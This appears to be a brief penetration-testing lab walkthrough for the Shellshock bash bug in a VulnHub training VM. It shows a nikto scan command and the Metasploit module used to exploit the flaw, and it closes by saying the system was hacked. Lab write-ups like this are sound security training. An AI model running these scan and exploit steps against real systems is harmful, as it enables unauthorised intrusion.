# What is shellshock

https://en.wikipedia.org/wiki/Shellshock_(software_bug)

Lab Download:

https://www.vulnhub.com/entry/pentester-lab-cve-2014-6271-shellshock,104/

Vulnerability detection

<code> nikto -h ipadress </code>

![1](https://user-images.githubusercontent.com/32979760/112722613-afb9a400-8f1b-11eb-905b-f7ed9569f8db.PNG)

Shellshock Exploit

Open msfconsole

<code>use exploit/multi/http/apache_mod_cgi_bash_env_exec</code>

![2](https://user-images.githubusercontent.com/32979760/112722709-235bb100-8f1c-11eb-8c99-27fcd28bc59c.PNG)

![3](https://user-images.githubusercontent.com/32979760/112722737-3f5f5280-8f1c-11eb-956f-7677cf99936f.PNG)

As you can see we hacked the system.
